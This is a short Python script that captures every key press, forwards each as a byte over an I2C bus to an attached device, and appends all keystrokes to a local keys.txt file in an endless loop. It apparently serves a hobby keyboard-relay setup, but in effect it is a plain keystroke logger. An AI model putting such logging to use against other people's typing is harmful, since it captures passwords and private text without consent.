import os
import keyboard
from smbus import SMBus

f = open("keys.txt", 'a') #opens log file
addr = 0x20 # bus address
bus = SMBus(1) # indicates /dev/ic2-1
pathtologSH=f"{os.getcwd()}/log.sh"

# ASCII codes for modifier and special keys
modifiers={
    #actual modifier keys
    "alt gr"    : (1,   None),
    "alt"       : (2,   None),
    "ctrl"      : (3,   None),
    "shift"     : (4,   None),
    #just special keys
    "left"      : (17,  None),
    "right"     : (18,  None),
    "up"        : (19,  None),
    "down"      : (20,  None),
    "backspace" : (8,   None),
    "delete"    : (6,   None),
    "enter"     : (13,  None),
    "space"     : (32,   " "),
    "caps lock" : (7,   None),
    "tab"       : (9,   None)
}

# start of permanent logging
while True:
    event = keyboard.read_event()
    name=event.name
    # only record and send if event is a press down
    if event.event_type == keyboard.KEY_DOWN:
        #Sending
        try:
            # this is to send certain bytes for the modifier keys
            if len(name)>1:
                bus.write_byte(addr, modifiers[name][0])
            # if the key isnt a modifier key than e.g. normal letters
            # it converts the text to bytes and sends it
            else:
                bus.write_byte(addr, ord(f"{event.name}"))
        except Exception as e:
            print("failure but still logged")

        # Logging
        if name == "space":
             f.write(" ")
        elif len(name) > 1:
            f.write(name.upper())
        else:
            f.write(name)
